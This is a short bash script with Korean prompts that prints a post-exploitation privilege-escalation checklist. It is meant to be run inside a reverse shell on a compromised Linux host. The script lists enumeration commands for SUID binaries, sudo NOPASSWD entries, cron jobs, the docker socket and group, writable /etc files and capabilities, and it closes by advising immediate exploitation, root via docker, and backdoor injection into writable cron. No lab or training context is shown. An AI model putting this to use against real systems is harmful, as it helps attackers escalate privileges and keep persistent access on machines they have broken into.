#!/bin/bash
echo "============================================================"
echo "🔓 권한 상승 가능성 체크"
echo "============================================================"
echo ""
echo "리버스 쉘에서 아래 명령어들을 순서대로 실행하세요:"
echo ""

echo "1. SUID 바이너리 찾기"
echo "------------------------------------------------------------"
cat << 'EOF'
find / -perm -4000 -type f 2>/dev/null
EOF
echo ""

echo "2. sudo 권한 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
sudo -l
EOF
echo ""

echo "3. 현재 사용자 권한"
echo "------------------------------------------------------------"
cat << 'EOF'
id
groups
EOF
echo ""

echo "4. Kernel 버전 (CVE 확인용)"
echo "------------------------------------------------------------"
cat << 'EOF'
uname -a
cat /etc/os-release
EOF
echo ""

echo "5. Cron jobs 확인 (쓰기 가능한지)"
echo "------------------------------------------------------------"
cat << 'EOF'
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/crontabs/
EOF
echo ""

echo "6. Docker/LXC 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
groups | grep -E 'docker|lxd|lxc'
ls -la /var/run/docker.sock
EOF
echo ""

echo "7. 쓰기 가능한 /etc 파일"
echo "------------------------------------------------------------"
cat << 'EOF'
find /etc -writable -type f 2>/dev/null
EOF
echo ""

echo "8. Capabilities 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
getcap -r / 2>/dev/null
EOF
echo ""

echo "9. 비밀번호 없는 sudo 항목"
echo "------------------------------------------------------------"
cat << 'EOF'
sudo -l 2>/dev/null | grep NOPASSWD
EOF
echo ""

echo "10. /tmp 실행 가능 여부"
echo "------------------------------------------------------------"
cat << 'EOF'
mount | grep /tmp
echo '#!/bin/bash\nid' > /tmp/test.sh
chmod +x /tmp/test.sh
/tmp/test.sh
rm /tmp/test.sh
EOF
echo ""

echo "============================================================"
echo "결과를 보고 다음 단계 결정:"
echo "============================================================"
echo ""
echo "만약 찾았다면:"
echo "- SUID 바이너리 → GTFOBins 확인"
echo "- sudo NOPASSWD → 즉시 악용"
echo "- docker 그룹 → docker 컨테이너로 root"
echo "- 쓰기 가능한 cron → 백도어 주입"
echo ""
echo "============================================================"
